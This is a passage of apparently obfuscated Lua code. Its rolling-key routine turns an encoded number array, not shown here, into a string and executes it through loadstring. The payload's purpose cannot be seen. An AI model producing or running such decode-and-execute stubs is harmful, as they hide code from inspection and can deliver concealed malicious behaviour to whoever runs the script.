    local function VM_1lll11l(d, k, m)
        local R_I1O1IlO = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_I1O1IlO, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_I1O1IlO)
    end

    -- Execution Guard
    local F_IIOI = loadstring(VM_1lll11l(B_1lI1O0O, 95, 5))
    if F_IIOI then
        F_IIOI(...)
    end
end)(...)
